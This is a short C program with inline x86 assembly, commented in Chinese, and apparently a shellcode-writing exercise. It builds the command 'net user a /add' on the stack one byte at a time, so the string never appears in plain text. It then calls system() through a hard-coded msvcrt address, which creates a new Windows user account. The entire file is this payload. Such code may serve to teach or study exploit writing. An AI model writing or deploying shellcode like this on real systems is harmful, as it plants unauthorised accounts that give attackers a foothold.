#include <windows.h>
#include <winbase.h>
void main()
{
	LoadLibrary("msvcrt.dll");
	__asm {
		push ebp; 保存ebp，esp－4
		mov ebp, esp; 给ebp赋新值，将作为局部变量的基指针
		xor edi, edi;
		push edi; 压入0，esp－4,
			;作用是构造字符串的结尾\0字符
			sub esp, 0ch
			mov byte ptr[ebp - 10h], 6eh; n
			mov byte ptr[ebp - 0fh], 65h; e
			mov byte ptr[ebp - 0eh], 74h; t
			mov byte ptr[ebp - 0dh], 20h; 空格
			mov byte ptr[ebp - 0ch], 75h; u
			mov byte ptr[ebp - 0bh], 73h; s
			mov byte ptr[ebp - 0ah], 65h; e
			mov byte ptr[ebp - 09h], 72h; r
			mov byte ptr[ebp - 08h], 20h; 空格
			mov byte ptr[ebp - 07h], 61h; a
			mov byte ptr[ebp - 06h], 20h; 空格
			mov byte ptr[ebp - 05h], 2fh; /
			mov byte ptr[ebp - 04h], 61h; a
			mov byte ptr[ebp - 03h], 64h; d
			mov byte ptr[ebp - 02h], 64h; d
			lea eax, [ebp - 10h];
		push eax; 串地址作为参数入栈
			mov eax, 0x77bf93c7;
		call eax; 调用system
	}
}
